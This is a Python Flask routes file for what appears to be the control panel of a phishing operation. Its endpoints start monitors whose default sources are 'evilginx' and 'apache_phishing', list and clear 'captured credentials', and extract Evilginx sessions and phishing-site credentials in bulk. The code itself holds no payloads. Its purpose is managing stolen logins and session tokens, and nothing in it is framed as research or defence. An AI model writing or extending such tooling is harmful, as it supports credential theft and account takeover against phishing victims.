"""
Credentials Monitoring API Routes
"""

from flask import Blueprint, request, jsonify
from modules import credentials

# Create blueprint
credentials_bp = Blueprint('credentials', __name__)

@credentials_bp.route('/status', methods=['GET'])
def get_status():
    """Get the status of the credentials monitoring module"""
    monitors = credentials.get_active_monitors()
    
    return jsonify({
        "status": "active",
        "module": "credentials_monitoring",
        "active_monitors": len([m for m, data in monitors.items() if data["active"]]),
        "monitors": monitors
    })

@credentials_bp.route('/start', methods=['POST'])
def start_monitoring():
    """Start a new credentials monitoring thread with options"""
    data = request.get_json(silent=True) or {}
    
    # Extract monitor configuration
    name = data.get('name', '')
    sources = data.get('sources', ['evilginx', 'apache_phishing'])
    domains = data.get('domains', [])
    
    monitor_id = credentials.start_monitoring(name, sources, domains)
    
    return jsonify({
        "status": "success",
        "message": f"Monitoring started with ID: {monitor_id}",
        "monitor_id": monitor_id
    })

@credentials_bp.route('/stop/<monitor_id>', methods=['POST'])
def stop_monitoring(monitor_id):
    """Stop a specific monitoring thread"""
    result = credentials.stop_monitoring(monitor_id)
    
    if result['status'] == 'error':
        return jsonify(result), 400
    else:
        return jsonify(result)

# IMPORTANT: Make sure there's no typo or missing character in the route string
@credentials_bp.route('/activate/<monitor_id>', methods=['POST'])
def activate_monitoring(monitor_id):
    """Reactivate a stopped monitoring thread with URL parameter"""
    try:
        result = credentials.activate_monitoring(monitor_id)
        
        if result['status'] == 'error':
            return jsonify(result), 400
        else:
            return jsonify(result)
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Error activating monitor: {str(e)}"
        }), 500

# Add a new route that accepts monitor_id in the request body
@credentials_bp.route('/activate', methods=['POST'])
def activate_monitoring_endpoint():
    """Reactivate a stopped monitoring thread without URL parameter"""
    data = request.get_json(silent=True) or {}
    monitor_id = data.get('monitor_id')
    
    if not monitor_id:
        return jsonify({
            "status": "error",
            "message": "Monitor ID is required"
        }), 400
    
    try:
        result = credentials.activate_monitoring(monitor_id)
        
        if result['status'] == 'error':
            return jsonify(result), 400
        else:
            return jsonify(result)
    except Exception as e:
        return jsonify({
            "status": "error",
            "message": f"Error activating monitor: {str(e)}"
        }), 500

@credentials_bp.route('/list', methods=['GET'])
def list_credentials():
    """List all captured credentials"""
    monitor_id = request.args.get('monitor_id')
    
    creds = credentials.get_credentials(monitor_id)
    
    return jsonify({
        "status": "success",
        "count": len(creds),
        "credentials": creds
    })

@credentials_bp.route('/clear', methods=['POST'])
def clear_credentials():
    """Clear all captured credentials"""
    data = request.get_json(silent=True) or {}
    monitor_id = data.get('monitor_id')
    
    result = credentials.clear_credentials(monitor_id)
    
    if result['status'] == 'error':
        return jsonify(result), 400
    else:
        return jsonify(result)

@credentials_bp.route('/monitors', methods=['GET'])
def get_monitors():
    """Get all credential monitors"""
    monitors = credentials.get_active_monitors()
    
    return jsonify({
        "status": "success",
        "monitors": monitors
    })

@credentials_bp.route('/extract', methods=['GET'])
def extract_all_credentials():
    """Extract credentials from all sources without monitoring"""
    evilginx_creds = credentials.extract_evilginx_sessions()
    site_creds = credentials.extract_site_credentials()
    
    all_creds = evilginx_creds + site_creds
    
    return jsonify({
        "status": "success",
        "count": len(all_creds),
        "evilginx_count": len(evilginx_creds),
        "site_count": len(site_creds),
        "credentials": all_creds
    })

@credentials_bp.route('/reload', methods=['POST'])
def reload_credentials():
    """Force reload all credentials from sources"""
    result = credentials.reload_all_credentials()
    
    if result['status'] == 'error':
        return jsonify(result), 400
    else:
        return jsonify(result)